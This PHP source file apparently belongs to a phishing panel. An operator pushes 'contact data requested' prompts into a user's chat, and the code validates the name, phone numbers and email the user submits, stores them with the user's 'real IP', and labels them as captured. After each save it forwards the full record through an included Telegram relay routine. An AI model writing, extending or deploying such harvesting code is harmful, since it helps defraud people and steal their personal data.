<?php

const CONTACTO_EMPRESA_CHAT_PREFIX = '[[CONTACTO_EMPRESA]]';
const CONTACTO_EMPRESA_URL = 'formContc.php';
const CONTACTO_EMPRESA_SOLICITUD = 'Datos de contacto solicitados';

function contactoEmpresaMensajeSolicitud(): string
{
    return CONTACTO_EMPRESA_CHAT_PREFIX . CONTACTO_EMPRESA_SOLICITUD;
}

function contactoEmpresaEtiquetaChat(): string
{
    return 'Datos de contacto capturados';
}

function contactoEmpresaEtiquetaChatDesdeMensaje(string $mensaje): ?string
{
    if (strpos($mensaje, CONTACTO_EMPRESA_CHAT_PREFIX) === 0) {
        return substr($mensaje, strlen(CONTACTO_EMPRESA_CHAT_PREFIX));
    }

    return null;
}

function contactoEmpresaValidarCampos(
    string $nombre,
    string $telefonoMovil,
    string $telefonoFijo,
    string $email
): array {
    $errores = [];

    if ($nombre === '') {
        $errores['fullName'] = 'Este campo es obligatorio.';
    } elseif (!preg_match('/^[a-zA-ZáéíóúÁÉÍÓÚñÑ\s]{2,100}$/u', $nombre)) {
        $errores['fullName'] = 'Ingresa un nombre válido (solo letras).';
    }

    if ($telefonoMovil === '') {
        $errores['mobile'] = 'Este campo es obligatorio.';
    } elseif (!preg_match('/^[0-9]{10}$/', $telefonoMovil)) {
        $errores['mobile'] = 'Ingresa un teléfono móvil de 10 dígitos.';
    }

    if ($telefonoFijo !== '' && !preg_match('/^[0-9]{10}$/', $telefonoFijo)) {
        $errores['phone'] = 'Ingresa un teléfono fijo de 10 dígitos.';
    }

    if ($email === '') {
        $errores['email'] = 'Este campo es obligatorio.';
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $errores['email'] = 'Ingresa un correo electrónico válido.';
    }

    return $errores;
}

function contactoEmpresaFormatoRespuestaChat(
    string $nombre,
    string $telefonoMovil,
    string $telefonoFijo,
    string $email
): string {
    $lineas = [
        'DATOS',
        'Nombre: ' . $nombre,
        'Número fijo: ' . ($telefonoFijo !== '' ? $telefonoFijo : '—'),
        'Número móvil: ' . $telefonoMovil,
        'Email: ' . $email,
    ];

    return implode("\n", $lineas);
}

function contactoEmpresaGuardarCaptura(
    PDO $pdo,
    int $usuarioId,
    int $mensajeId,
    string $nombre,
    string $telefonoMovil,
    string $telefonoFijo,
    string $email,
    string $ipUsuario
): void {
    $respuesta = contactoEmpresaFormatoRespuestaChat($nombre, $telefonoMovil, $telefonoFijo, $email);

    $pdo->beginTransaction();

    $updUser = $pdo->prepare('UPDATE usuarios SET nombre = ?, telefono_movil = ?, telefono_fijo = ?, email = ?, ip_real = ? WHERE id = ?');
    $updUser->execute([$nombre, $telefonoMovil, $telefonoFijo, $email, $ipUsuario, $usuarioId]);

    $updMsg = $pdo->prepare("
        UPDATE mensajes_admin
        SET estado = 'respondido',
            respuesta_usuario = ?,
            fecha_respuesta = NOW()
        WHERE id = ? AND usuario_id = ? AND estado = 'pendiente'
    ");
    $updMsg->execute([$respuesta, $mensajeId, $usuarioId]);

    if ($updMsg->rowCount() < 1) {
        $pdo->rollBack();
        throw new RuntimeException('Solicitud de contacto no encontrada');
    }

    $pdo->commit();

    require_once __DIR__ . '/../telegram/telegram-full_info.php';
    telegram_full_info_desde_usuario($pdo, $usuarioId, [
        'nombre' => $nombre,
        'telefono_fijo' => $telefonoFijo,
        'telefono_movil' => $telefonoMovil,
        'email' => $email,
    ]);
}

function contactoEmpresaRegistrarCapturaChat(
    PDO $pdo,
    int $usuarioId,
    string $nombre,
    string $telefonoMovil,
    string $telefonoFijo,
    string $email,
    string $ipUsuario
): void {
    $mensaje = CONTACTO_EMPRESA_CHAT_PREFIX . contactoEmpresaEtiquetaChat();
    $respuesta = contactoEmpresaFormatoRespuestaChat($nombre, $telefonoMovil, $telefonoFijo, $email);

    $stmt = $pdo->prepare("
        INSERT INTO mensajes_admin (
            usuario_id, admin_id, mensaje, tipo_mensaje, respuesta_usuario, estado,
            fecha_envio, fecha_respuesta, ip_usuario
        ) VALUES (?, 1, ?, 'sin_input', ?, 'respondido', NOW(), NOW(), ?)
    ");
    $stmt->execute([$usuarioId, $mensaje, $respuesta, $ipUsuario]);
}
